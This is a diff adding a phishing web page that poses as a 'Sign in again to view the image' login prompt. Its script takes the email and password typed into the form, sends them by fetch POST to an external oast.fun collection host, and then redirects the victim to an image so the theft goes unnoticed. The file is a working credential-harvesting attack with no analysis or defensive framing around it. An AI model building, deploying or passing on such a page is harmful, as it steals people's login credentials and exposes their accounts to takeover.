@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in again</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://raw.githubusercontent.com/MrDottt/web/refs/heads/main/favicon.ico">
+
+    <style>
+        /* General Page Styles */
+        body {
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            position: relative;
+        }
+
+        /* Header Icon - Reduced by 60% */
+        .header-icon {
+            position: absolute;
+            top: 0.5px;
+            left: 1.1in;
+            width: 17%;  /* Scaled down */
+            height: auto; /* Keep aspect ratio */
+        }
+
+        /* Login Form Container */
+        .login-container {
+            background-color: #0F172A;
+            padding: 40px;
+            border-radius: 10px;
+            width: 360px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Header Text */
+        .login-container h2 {
+            color: #FFFFFF;
+            margin-bottom: 10px;
+        }
+
+        .login-container p {
+            color: #A0AEC0;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        /* Input Fields */
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #FFFFFF;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            background-color: #1E293B;
+            color: #FFFFFF;
+            font-size: 14px;
+        }
+
+        /* Remember Me & Forgot Password */
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #A0AEC0;
+            margin-bottom: 20px;
+        }
+
+        .remember-forgot a {
+            color: #3B82F6;
+            text-decoration: none;
+        }
+
+        /* Login Button */
+        .login-btn {
+            background-color: #3B82F6;
+            color: #FFFFFF;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* Sign Up Link */
+        .signup-link {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #A0AEC0;
+        }
+
+        .signup-link a {
+            color: #3B82F6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Icon -->
+    <img src="https://i.ibb.co.com/nqZprR40/image.png" alt="Header Icon" class="header-icon">
+
+    <div class="login-container">
+        <h2>Sign in again to view the image</h2>
+        <p>Please enter your details to sign in</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Email or Username</label>
+                <input type="text" id="loginUsername" placeholder="Enter email or username">
+            </div>
+            
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="Enter your password">
+            </div>
+
+            <div class="remember-forgot">
+                <div>
+                    <input type="checkbox" id="remember-me">
+                    <label for="remember-me">Remember me</label>
+                </div>
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+
+        <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission behavior
+            event.preventDefault();
+
+            // Get the values entered by the user
+            var email = document.getElementById('loginUsername').value;
+            var password = document.getElementById('loginPassword').value;
+
+            // Log the email and password
+            console.log("Email:", email);
+            console.log("Password:", password);
+
+            // Send the email and password to the server
+            fetch('https://abluervtqwqdjgfbnsjkbjl3xx11u7y5j.oast.fun', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => {
+                // Redirect the user to the specified link
+                window.location.href = 'https://us-lax-1.linodeobjects.com/sojooo/communities/navigating_narratives/banner-1bc77d09eca18144.png';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+
+</body>
+</html>
